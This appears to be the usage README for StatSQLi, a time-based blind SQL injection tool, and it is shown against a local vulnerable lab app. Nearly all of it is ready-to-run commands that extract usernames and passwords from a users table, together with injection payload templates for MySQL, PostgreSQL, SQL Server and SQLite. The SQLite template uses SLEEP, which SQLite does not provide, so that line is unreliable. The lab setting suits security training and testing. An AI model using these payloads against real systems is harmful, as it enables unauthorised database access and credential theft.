# StatSQLi Usage Examples

## Complete Working Commands

### Basic Extraction (Simplest)

```bash
statsqli "http://127.0.0.1:5000/vulnerable?id=1" \
    --payload "1 OR ({condition}) AND SLEEP(2) -- -" \
    --table users \
    --column username \
    --where "1=1 LIMIT 0,1"
```

### With Parallel Extraction (Faster)

```bash
statsqli "http://127.0.0.1:5000/vulnerable?id=1" \
    --payload "1 OR ({condition}) AND SLEEP(2) -- -" \
    --table users \
    --column username \
    --where "1=1 LIMIT 0,1" \
    --parallel
```

### For SQLite Lab App (What You Have Running)

```bash
statsqli "http://127.0.0.1:5000/vulnerable?id=1" \
    --payload "1 OR ({condition}) AND SLEEP(2) -- -" \
    --table users \
    --column username \
    --where "1=1 LIMIT 0,1" \
    --delay 2 \
    --parallel
```

### Extract Password

```bash
statsqli "http://127.0.0.1:5000/vulnerable?id=1" \
    --payload "1 OR ({condition}) AND SLEEP(2) -- -" \
    --table users \
    --column password \
    --where "1=1 LIMIT 0,1" \
    --max-length 30
```

### Extract Different User

```bash
# Extract second user (alice)
statsqli "http://127.0.0.1:5000/vulnerable?id=1" \
    --payload "1 OR ({condition}) AND SLEEP(2) -- -" \
    --table users \
    --column username \
    --where "1=1 LIMIT 1,1" \
    --parallel
```

### With Custom Delay

```bash
statsqli "http://127.0.0.1:5000/vulnerable?id=1" \
    --payload "1 OR ({condition}) AND SLEEP(2) -- -" \
    --table users \
    --column username \
    --delay 1.5 \
    --parallel
```

## Command Breakdown

```bash
statsqli [URL]              # Target vulnerable URL (required)
    --payload [TEMPLATE]     # SQL injection template with {condition}
    --table [TABLE]          # Database table name
    --column [COLUMN]         # Column to extract
    --where [CLAUSE]         # WHERE clause (e.g., "1=1 LIMIT 0,1")
    --delay [SECONDS]        # Delay in seconds (optional, auto-detected)
    --parallel               # Enable parallel extraction (faster)
    --workers [NUMBER]       # Number of parallel workers (default: 4)
    --max-length [NUMBER]    # Maximum string length (default: 100)
```

## Real Example (Copy-Paste Ready)

**Make sure lab app is running first:**
```bash
# Terminal 1
cd lab
python app.py
```

**Then in Terminal 2:**
```bash
# Extract first username
statsqli "http://127.0.0.1:5000/vulnerable?id=1" --payload "1 OR ({condition}) AND SLEEP(2) -- -" --table users --column username --where "1=1 LIMIT 0,1" --parallel

# Extract first password  
statsqli "http://127.0.0.1:5000/vulnerable?id=1" --payload "1 OR ({condition}) AND SLEEP(2) -- -" --table users --column password --where "1=1 LIMIT 0,1" --parallel
```

## Common Payload Templates

### MySQL
```bash
--payload "' OR ({condition}) AND SLEEP(2) -- -"
```

### PostgreSQL  
```bash
--payload "' OR ({condition}) AND pg_sleep(2) -- -"
```

### SQL Server
```bash
--payload "' OR ({condition}) AND WAITFOR DELAY '00:00:02' -- -"
```

### SQLite (Lab App)
```bash
--payload "1 OR ({condition}) AND SLEEP(2) -- -"
```

## Tips

1. **Always include `{condition}` placeholder** in your payload - StatSQLi replaces this with actual conditions
2. **Use `--parallel`** for faster extraction
3. **Adjust `--delay`** if your network is slow or fast
4. **Use `--max-length`** to limit extraction for faster testing

## Error: "unrecognized arguments"

The `...` in documentation is just a placeholder. Always use the full command with all arguments. See examples above for working commands.

